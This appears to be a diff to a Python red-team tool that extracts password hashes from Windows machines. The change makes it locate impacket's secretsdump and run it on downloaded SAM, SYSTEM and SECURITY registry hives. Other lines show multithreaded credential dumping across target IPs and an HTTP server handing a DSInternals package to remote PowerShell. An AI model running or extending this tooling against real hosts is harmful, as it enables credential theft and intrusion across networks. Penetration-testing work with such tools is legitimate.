@@ -6,6 +6,8 @@ import argparse
 import socket
 import string
 import zipfile
+import shutil
+import sys
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -195,8 +197,17 @@ def process_registry_hives(zip_path, ip):
         system_path = os.path.join(extract_dir, 'SYSTEM')
         security_path = os.path.join(extract_dir, 'SECURITY')
         
+        sd_cmd = "secretsdump.py"
+        if shutil.which("impacket-secretsdump"):
+            sd_cmd = "impacket-secretsdump"
+        elif shutil.which("secretsdump.py"):
+            sd_cmd = "secretsdump.py"
+        else:
+            print("[-] impacket not found, cannot secretsdump from downloaded hives. Install with: pipx install impacket")
+            sys.exit(1)
+
         cmd = [
-            'secretsdump.py',
+            sd_cmd,
             '-sam', sam_path,
             '-system', system_path,
             '-security', security_path,
@@ -324,7 +335,6 @@ print_lock = threading.Lock()
 
 
 def generate_command(ip, username, password, just_dc_user, verbose, show_output, show_single_output):
-    """Generate and execute PowerShell command for target"""
     
     with print_lock:
         print(f"[*] Attempting to secretsdump on {ip} using credentials {username}:{password}")
@@ -407,7 +417,6 @@ if ($isDC) {{
 
 
 def main(args):
-    """Main execution function"""
     dsinternals_path = os.path.join(UPLOAD_DIR, DSINTERNALS_ZIP)
     
     if not os.path.exists(dsinternals_path):
@@ -470,7 +479,7 @@ if __name__ == "__main__":
     parser.add_argument("-t", "--threads", type=int, default=10,
                         help="Concurrent threads (default: 10)")
     parser.add_argument("-just-dc-user", dest="just_dc_user", 
-                        help="Extract only one user")
+                        help="Extract only one user. Only available on Domain Controllers.")
     parser.add_argument("-v", "--verbose", action="store_true",
                         help="Show exec_across_windows output")
     parser.add_argument("-o", "--show-output", action="store_true",
